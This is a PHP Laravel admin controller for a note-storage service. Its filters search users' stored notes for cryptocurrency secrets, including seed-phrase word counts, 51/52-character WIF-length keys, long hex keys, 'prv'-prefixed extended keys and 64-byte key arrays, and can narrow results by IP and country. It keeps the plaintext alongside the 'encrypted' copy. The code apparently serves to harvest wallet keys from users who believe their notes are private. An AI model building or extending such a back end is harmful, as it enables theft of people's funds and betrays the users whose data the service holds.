<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Ban;
use App\Models\Note;
use App\Services\GibberishAES;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class NoteController extends Controller
{


    /*
    * Show notes page.
    */
    public function showNotes(Request $request)
    {
        $notes = Note::withTrashed();
        if ($request->has('status') && !empty($request->get('status'))) {
            if ($request->get('status') == 'deleted') {
                $notes = Note::onlyTrashed();
            } elseif ($request->get('status') == 'not_deleted') {
                $notes = Note::query();
            }
        }

        $notes = $notes->select(['*', DB::raw("DATE_FORMAT(created_at, '%Y-%m-%d') as formatted_date")]);

        if ($request->has('viewed') && !empty($request->get('viewed'))) {
            $viewed = $request->get('viewed') === 'yes';
            $notes = $notes->where('viewed', $viewed);
        }

        if ($request->has('sites') && !empty($request->get('sites'))) {
            $site = $request->get('sites');
            $notes = $notes->where('text', 'like', "%.{$site}%");
        }

        if ($request->has('show_bip_1') && !empty($request->get('show_bip_1'))) {
            $bip1Values = explode('_', $request->get('show_bip_1'));
            if (count($bip1Values) > 1) {
                $notes = $notes->where('bip_1_count', '>=', $bip1Values[1]);
                if (isset($bip1Values[3])) {
                    $notes = $notes->where('bip_1_count', '<=', $bip1Values[3]);
                }
            } elseif (count($bip1Values) == 1) {
                $notes = $notes->where(['bip_1_count' => $bip1Values[0]]);
            }
        }

        if ($request->has('show_bip_2') && !empty($request->get('show_bip_2'))) {
            $bip2Values = explode('_', $request->get('show_bip_2'));
            if (count($bip2Values) > 1) {
                $notes = $notes->where('bip_2_count', '>=', $bip2Values[1]);
                if (isset($bip2Values[3])) {
                    $notes = $notes->where('bip_2_count', '<=', $bip2Values[3]);
                }
            } elseif (count($bip2Values) == 1) {
                $notes = $notes->where(['bip_2_count' => $bip2Values[0]]);
            }
        }

        if ($request->has('show_bip_3') && !empty($request->get('show_bip_3'))) {
            $bip3Values = explode('_', $request->get('show_bip_3'));
            if (count($bip3Values) > 1) {
                $notes = $notes->where('bip_3_count', '>=', $bip3Values[1]);
                if (isset($bip3Values[3])) {
                    $notes = $notes->where('bip_3_count', '<=', $bip3Values[3]);
                }
            } elseif (count($bip3Values) == 1) {
                $notes = $notes->where(['bip_3_count' => $bip3Values[0]]);
            }
        }


        if ($request->has('search') && !empty($request->get('search'))) {
            $notes = $notes->where('text', 'LIKE', '%' . $request->get('search') . '%');
        }
        if ($request->has('prv') && !empty($request->get('prv'))) {
            $prvSearch = $request->get('prv');
            $notes = $notes->where('text', 'REGEXP', "(^|\s){$prvSearch}[a-zA-Z0-9].*($|\s)");
        }
        if ($request->has('hash')) {
            switch ($request->get('hash')) {
                case \App\Enums\Hash::HASH_64:
                    $notes = $notes->where('text', 'REGEXP', '(^|\s)[a-zA-Z0-9]{64,128}($|\s)');
                    break;
                case \App\Enums\Hash::HASH_51:
                    $notes = $notes->where('text', 'REGEXP', '(^|\s)[a-zA-Z0-9]{51}($|\s)');
                    break;
                case \App\Enums\Hash::HASH_52:
                    $notes = $notes->where('text', 'REGEXP', '(^|\s)[a-zA-Z0-9]{52}($|\s)');
            }
        }

        if ($request->has('by_numbers') && !empty($request->get('by_numbers'))) {
            $notes = $notes->where('text', 'REGEXP', '(^|\s)\[((\d{1,7})(,\d{1,7}){63})\]($|\s)');
        }

        if ($request->has('ip') && !empty($request->get('ip'))) {
            $notes = $notes->where(['ip' => $request->get('ip')]);
        }
        if ($request->has('country') && !empty($request->get('country'))) {
            $notes = $notes->where(['country_name' => $request->get('country')]);
        }


        if ($request->has('coincidence')) {
            if ($request->get('coincidence') === '1') {
                $notes = $notes->where(DB::raw("CHAR_LENGTH(contain)"), '>', 0);
            } else if ($request->get('coincidence') === '0') {
                $notes = $notes->where(DB::raw("CHAR_LENGTH(contain)"), '=', 0);
            }
        }

        if ($request->has('date') && !empty($request->get('date'))) {
            $start = explode(' - ', $request->get('date'))[0];
            $end = explode(' - ', $request->get('date'))[1];

            if ($start === $end) {
                $notes = $notes->having('formatted_date', '=', $start);
            } else {
                $notes = $notes->havingBetween('formatted_date', [$start, $end]);
            }
        }

        $notes = $notes->orderBy('id', 'desc')->paginate(50);


        return view('admin.notes.index', [
            'notes' => $notes
        ]);
    }

    /**
     * Handle update form.
     */
    public function update(Request $request)
    {

        $note = Note::withTrashed()->where('id', '=', $request->input('id'))->firstOrFail();
        $siteHash = hash('sha512', $note->slug);
        $separator = hash('sha512', '-- tab separator --');
        $note->text = $request->input('text');
        $note->text_raw = $request->input('text_raw');
        $note->encrypted_content = GibberishAES::enc($note->text->implode($separator) . $siteHash, $note->password);
        if ($note->encrypted_content !== false) {
            $note->save();
        }
        return back();
    }

    /**
     * Handle update form.
     */
    public function delete(Request $request)
    {
        $message = '';
        if ($request->input('id')) {
            $note = Note::withTrashed()->where('id', '=', $request->input('id'))->firstOrFail();
            $note->forceDelete();
            $message = 'Заметка удалена';
        }


        if ($request->input('delete_ids') && !empty($request->input('delete_ids'))) {
            $notes = Note::withTrashed()->whereIn('id', $request->input('delete_ids'));
            $notes->forceDelete();
            $message = 'Выбранные заметки удалены';
        }

        if ($request->input('delete_all')) {
            if (!empty($request->input('password'))) {
                if (Hash::check($request->input('password'), auth()->user()->password)) {
                    Note::truncate();
                    $message = 'Все заметки удалены';
                } else {
                    $message = 'Неправильный пароль';
                }
            } else {
                $message = 'Требуется пароль';
            }

        }


        return back()->with('error', $message);
    }

    /**
     * Handle ban ip form.
     */
    public function banIp(Request $request)
    {
        $key = $request->input('ip');
        $banned_model = new Ban;
        if (!$banned_model::where('ip', $key)->first()) {
            $banned_model::insert([
                [
                    'ip' => $key,
                    'created_at' => Carbon::now(),
                    'deleted_at' => Carbon::now()
                ]
            ]);
        } elseif ($banned = $banned_model::where('ip', $key)->first()) {
            $banned->delete();
        }


        return back();
    }

    /**
     * Handle unban ip form.
     */
    public function unbanIp(Request $request)
    {
        $key = $request->input('ip');
        if ($banned = Ban::withTrashed()->where('ip', $key)->first()) {
            $banned->restore();
        }

        return back();
    }

    /**
     * Get IP Addresses.
     */
    public function getIpAddresses(Request $request)
    {
        $search = $request->q;
        $ipAddresses = Note::withTrashed()->select('ip')->where('ip', 'LIKE', "%$search%");
        if ($search) {
            $ipAddresses = $ipAddresses->where('ip', 'LIKE', "%$search%");
        }
        $ipAddresses = $ipAddresses->groupBy('ip')->paginate(20, ['*'], 'page', $request->page)->toArray();
        return response()->json($ipAddresses);
    }

    /**
     * Get Countries.
     */
    public function getCountries(Request $request)
    {
        $search = $request->q;
        $countries = Note::withTrashed()->select('country_name')->where('ip', 'LIKE', "%$search%");
        if ($search) {
            $countries = $countries->where('ip', 'LIKE', "%$search%");
        }
        $countries = $countries->groupBy('country_name')->paginate(20, ['*'], 'page', $request->page)->toArray();
        return response()->json($countries);
    }


}
